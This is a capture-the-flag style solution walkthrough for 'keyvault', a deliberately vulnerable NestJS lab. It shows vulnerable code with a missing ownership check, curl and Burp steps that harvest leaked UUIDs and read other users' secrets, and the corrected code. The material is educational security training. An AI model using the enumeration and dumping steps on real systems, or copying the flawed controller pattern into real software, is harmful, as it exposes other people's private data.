# keyvault: Solution / Walkthrough

![CWE-639](https://img.shields.io/badge/CWE--639-IDOR-red?style=flat-square)
![Node](https://img.shields.io/badge/Node-NestJS-E0234E?style=flat-square&logo=nestjs&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**keyvault is an intentionally vulnerable application built for security education.** It contains a deliberate [IDOR / broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
(CWE-639) flaw so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the exploit and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* broken access control is and *how*
to approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read a NestJS controller and point to the exact missing check.
- Reproduce the exploit by hand, understanding how the id leaks.
- Explain **why** switching to UUIDs did not fix anything.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): an IDOR happens
> when an app fetches an object by a client-supplied id and returns it without
> checking the object belongs to the caller. A random UUID raises the cost of
> *guessing* the id — it does nothing about *authorization*.

<br>

## 🐛 The vulnerability

The secret detail route in `src/secrets/secrets.controller.ts` looks like this:

```ts
@Controller('api')
@UseGuards(AuthGuard)                      // session required — authentication only
export class SecretsController {
  // ⚠️ VULNERABLE: fetches by UUID with no ownership check.
  @Get('secrets/:id')
  async getOne(@Param('id', ParseUUIDPipe) id: string) {
    const secret = await this.secrets.findById(id);
    if (!secret) throw new NotFoundException('secret not found');
    return { secret };
  }
}
```

and the service (`src/secrets/secrets.service.ts`):

```ts
async findById(id: string): Promise<Secret | undefined> {
  const [row] = await db.select().from(secrets).where(eq(secrets.id, id)).limit(1);
  return row;                              // looked up by id ONLY — no owner filter
}
```

Walk through it the way the server does:

1. `AuthGuard` ensures there **is** a session — authentication. It says nothing
   about *which* secrets you may read.
2. `ParseUUIDPipe` validates the id is a well-formed UUID. So this is not about
   malformed input — a valid UUID sails straight through.
3. The query filters by `secrets.id = id` and **nothing else**. There is no
   `AND owner_id = <session user>`.
4. The handler returns whatever row matched. Any logged-in user can read any
   secret — if they know its UUID.

And here is the enabler — the "team activity" feed in the same service **leaks
other users' UUIDs**:

```ts
async activityFeed() {
  return db
    .select({
      id: secrets.id,                      // ← leaked identifier (not yours)
      title: secrets.title,
      owner: users.username,
      updatedAt: secrets.updatedAt,
    })
    .from(secrets)
    .innerJoin(users, eq(secrets.ownerId, users.id))
    .orderBy(desc(secrets.updatedAt))
    .limit(20);
}
```

> **Why does it look safe?** The ids are random UUIDs, so the team "felt" the
> secrets were unguessable and skipped the ownership check. But the activity feed
> cheerfully prints everyone's UUIDs, and the read endpoint honours any UUID it's
> handed. Randomness bought nothing.

<br>

## 💥 Exploitation

You log in as **alice** (`password123`). You cannot guess bob's UUID — but the
activity feed shows it to you.

With `curl`, using a cookie jar to hold the session:

```bash
# 1) Log in as alice and save the session cookie.
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  http://localhost:3000/api/login

# 2) The leak — the team activity feed exposes every secret's UUID + owner.
curl -s -b jar.txt http://localhost:3000/api/activity
```

In the feed you spot an entry owned by **bob** — his "Production root
credentials" secret — carrying the UUID `b0bb0b00-0000-4000-8000-00000000b0b5`.
You did not guess it; the app handed it to you.

```bash
# 3) The exploit — read bob's secret by the leaked UUID. Not yours, returned anyway.
curl -s -b jar.txt \
  http://localhost:3000/api/secrets/b0bb0b00-0000-4000-8000-00000000b0b5
```

Expected output (step 3), with the flag in the secret body:

```json
{
  "secret": {
    "id": "b0bb0b00-0000-4000-8000-00000000b0b5",
    "ownerId": 2,
    "title": "Production root credentials",
    "content": "root password rotated monthly. FLAG{KEYVAULT_GUESSING_NOT_REQUIRED}",
    "updatedAt": "2026-11-12T14:05:00.000Z"
  }
}
```

> **Where does the flag come from?** It is **not** in the repo on purpose — it is
> baked into the Docker image at build time (`ARG FLAG`) and the seed writes it
> into bob's secret (`ownerId: 2`). You have to actually break access control
> against the running app to read it; you can't grep the source.

<br>

## 🚀 Going further

The read endpoint returns *any* valid UUID, so the real exposure is every secret
whose id ever leaks — and UUIDs leak far more than people expect:

```bash
# Harvest every UUID the activity feed exposes, then read each one.
curl -s -b jar.txt http://localhost:3000/api/activity \
  | grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
  | while read id; do
      echo "== $id =="
      curl -s -b jar.txt "http://localhost:3000/api/secrets/$id"
      echo
    done
```

In a real engagement the leak channel might be a `Referer` header, a server log,
an analytics pixel, a shared link, or another API response — not a tidy feed.
The lesson is identical: once an unguessable id is *known*, a missing ownership
check exposes it.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and load <http://localhost:3000>. Log in as
   `alice`. The vault page already calls `/api/activity` — so the leaked UUIDs
   are sitting in **Proxy > HTTP history**.
2. Find the `GET /api/activity` response and read off a UUID whose `owner` is not
   alice (bob's "Production root credentials").
3. Take any `GET /api/secrets/<your-own-uuid>` request to **Repeater** as a
   baseline, then swap in bob's UUID and send. A different secret body — with the
   flag — confirms the IDOR.
4. (Optional) Send `/api/secrets/:id` to **Intruder** and feed it the list of
   UUIDs harvested from the feed to dump them all at once.

> Testing IDOR well means having **two identities**. Proving a secret owned by
> bob is readable while authenticated as alice is the proof of a broken
> authorization check — regardless of how random the id looks.

<br>

## 🛡️ The fix

Two things are wrong: the read endpoint doesn't authorize, and the feed
over-shares. Fix both.

**1. Scope the read to the owner (kills the IDOR).** Make the query itself
refuse other people's rows, so the check can't be forgotten:

```ts
// service: look up by id AND owner in one query.
async findOwnedById(id: string, userId: number): Promise<Secret | undefined> {
  const [row] = await db
    .select()
    .from(secrets)
    .where(and(eq(secrets.id, id), eq(secrets.ownerId, userId)))
    .limit(1);
  return row;
}

// controller: pass the session user, and 404 for anything not yours.
@Get('secrets/:id')
async getOne(
  @Param('id', ParseUUIDPipe) id: string,
  @Req() req: Request & { session: SessionData },
) {
  const secret = await this.secrets.findOwnedById(id, req.session.userId!);
  if (!secret) throw new NotFoundException('secret not found');  // 404, don't leak existence
  return { secret };
}
```

**2. Stop the feed leaking ids you can't act on.** A cross-user activity feed
should not expose raw object ids (or should only link to objects the viewer may
open). Show titles/owners without the `id`, or scope the feed to the caller.

Why this works: being logged in is necessary but not sufficient; every object
access re-checks ownership, the query can't return someone else's row, and `404`
(not `403`) means an attacker can't even confirm a given UUID exists.

### ⚠️ Tempting fixes that *don't* work

Part of learning is knowing which "fixes" are traps:

- **"We use UUIDs, so we're safe."** This is the whole point of the level.
  Unguessable ≠ authorized. A leaked UUID is just as exploitable as `id=4`.
  Harder-to-guess ids slow blind enumeration; they are never the access control.
- **Switching to ULIDs / longer ids / hashing the id.** Same mistake in a new
  costume — it's still obscurity, not authorization. (The series explores these
  disguises in later labs; the fix is always the ownership check.)
- **Removing the UUID from the activity feed but leaving the read endpoint
  open.** That closes *one* leak channel, but ids leak through logs, referrers
  and shared links too. Plug the authorization hole, not just one faucet.
- **Checking only that the user is logged in.** That's what the broken code
  already does. Authentication ≠ authorization.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **The id format is irrelevant to authorization.** Sequential, UUID, ULID,
   hashid — none of them decide *who may access the object*.
2. **Unguessable just means "capture instead of guess."** Real systems leak ids
   constantly; an attacker harvests them rather than brute-forcing.
3. **Authorize every object access on the server, every time, and fail closed.**
4. **Scope at the source.** `WHERE id = :id AND owner_id = :me` makes "forgot the
   check" structurally impossible.
5. **Don't over-share ids.** Listing/activity endpoints that expose object ids
   are a classic leak channel — treat ids as sensitive when they're the key to a
   broken endpoint.

That's Level 3 — IDOR on a non-guessable id. Previously,
**[pingboard (Level 2)](https://github.com/iv0ks/pingboard)** was a write IDOR
with mass assignment. Next in the series,
**[snapvault (Level 4)](https://github.com/iv0ks/snapvault)** keeps the IDOR but
wraps the id in **base64** — decode, alter, re-encode. Head back to the
**[Learning Guide](GUIDE.md)** for the method, or the **[README](README.md)**
for the lab setup.

<br>

> **Legal / ethics.** This is an educational, deliberately vulnerable lab. Run it
> only locally, on owned, isolated infrastructure, and never use these techniques
> against systems without explicit written authorization.
